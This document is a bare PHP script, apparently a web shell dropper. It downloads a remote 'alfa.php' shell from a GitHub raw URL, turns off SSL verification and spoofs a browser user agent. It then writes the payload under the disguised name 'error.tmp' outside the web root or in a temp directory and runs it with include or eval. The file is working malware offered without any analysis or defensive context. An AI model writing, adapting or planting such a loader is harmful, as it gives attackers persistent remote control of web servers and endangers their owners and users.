<?php

class Alfa {
	
	public $shell_url = "https://raw.githubusercontent.com/belphegorinj3ctor/alfa/master/alfa.php"; // default
	public $loader_name = "error.tmp"; // default
	
	private $loader_path = "";
	private $upload_directory = "";
	
	public function __construct() {
		$this -> upload_directory = $_SERVER["DOCUMENT_ROOT"] . "/../";
		$this -> loader_path = $this -> upload_directory . "/" . $this -> loader_name;
	}

	private function _fsockopen(){
		$shell = $this -> shell_url;
		if ( substr($shell, 0,5) != "https" ){
			if ( substr($shell, 0,11) != "http://www." ){
				$shell = str_replace( array("http://", "www.", "https://"), "", $shell);
				if ( substr($shell, 0,4) == "www." ){
					$shell = "http://" . $shell;
				}else{
					$shell = "http://www." . $shell;
				}
			}
		}
		$url_info = parse_url($shell);
		$port = 80;
		if ( !isset($url_info["path"]) ) {
			$url_info["path"] = "/";
		}
		if ( !isset($url_info["scheme"]) ) {
			$url_info["scheme"] = "";
		}
		if( $url_info["scheme"] == "https" ) {
			$url_info["scheme"] = "ssl://";
			$port = 443;
		}else{
			$url_info["scheme"] = "";
		}
		$shell = $url_info["scheme"] . $url_info["host"];
		$socket = @fsockopen($shell, $port, $errno, $errstr, 15);
		if($socket){
			$http  = "GET {$url_info["path"]} HTTP/1.0\r\n";
			$http .= "Host: {$url_info["host"]}\r\n";
			$http .= "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0\r\n";
			$http .= "Connection: close\r\n\r\n";
			fwrite($socket, $http);		
			$contents = "";
			while (!@feof($socket)) {
				$contents .= @fgets($socket, 4096);
			}
			list($header, $body) = explode("\r\n\r\n", $contents, 2);
			@fclose($socket);
			return $body;
		}else{
			return "";
		}
	}
	
	private function _curl(){
		$resp = "";
		if ( function_exists('curl_version') ){
			$curl = curl_init();
			curl_setopt_array($curl, array(
				CURLOPT_RETURNTRANSFER => 1,
				CURLOPT_URL => $this -> shell_url,
				CURLOPT_SSL_VERIFYPEER => false,
				CURLOPT_SSL_VERIFYHOST => false,
				CURLOPT_USERAGENT => 'Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0'
			));
			$resp = curl_exec($curl);
			curl_close($curl);	
		}
		return $resp;
	}
	
	private function getSource($method = "fsockopen"){
		$source = "";
		switch( $method ) {
			case "fsockopen":
				if ( function_exists("fsockopen") ) {
					$source = $this -> _fsockopen();
					if ( empty($source) ) {
						$this -> getSource("curl");
						return false;
					}
				} else {
					$this -> getSource("curl");
					return false;
				}
			break;
			case "curl":
				$source = $this -> _curl();
				if ( empty($source) ) {
					$this -> getSource("file_get_contents");
					return false;
				}
			break;
			case "file_get_contents":
				if ( function_exists("file_get_contents") ) {
					$source = @file_get_contents($this -> shell_url);
				}
			break;
		}
		return $source;
	}
	
	private function getTemp() {
		$tmp = false;
		$dirs = @ini_get("open_basedir");
		if ( !empty($dirs) ) {
			$dirs = explode(":", $dirs);
			foreach ( $dirs as $dir ) {
				if ( @is_writable( $dir ) ) {
					$tmp = $dir;
					break;
				}
			}
			$tmp = $tmp . "/" . $this -> loader_name;
		} else {
			if ( function_exists("sys_get_temp_dir") ) {
				if ( @is_writable ( str_replace('\\', '/', sys_get_temp_dir()) ) ) {
					$tmp = sys_get_temp_dir();
					$tmp = $tmp . "/" . $this -> loader_name;
				}
			}
		}
		return $tmp;
	}
	
	public function run(){
		if ( !@file_exists ($this -> loader_path) ) {
			$source = $this -> getSource();
			if( !empty($source) ) {
				if ( !@is_writable ( $this -> upload_directory ) ) {
					$this -> loader_path = $this -> getTemp();
				}
				if ( $this -> loader_path ) {
					if ( @file_put_contents( $this -> loader_path,  $source ) ) {
						include ( $this -> loader_path );
					} else {
						eval ("?>" . $source );
					}
				} else {
					eval ("?>" . $source );
				}
			} else {
				echo ("source is empty...!");
			}
		} else {
			include ( $this -> loader_path );
		}
	}
}

$alfa = new Alfa();

$alfa -> shell_url = "https://raw.githubusercontent.com/belphegorinj3ctor/alfa/master/alfa.php"; //optional
$alfa -> loader_name = "error.tmp"; //optional

$alfa -> run();

?>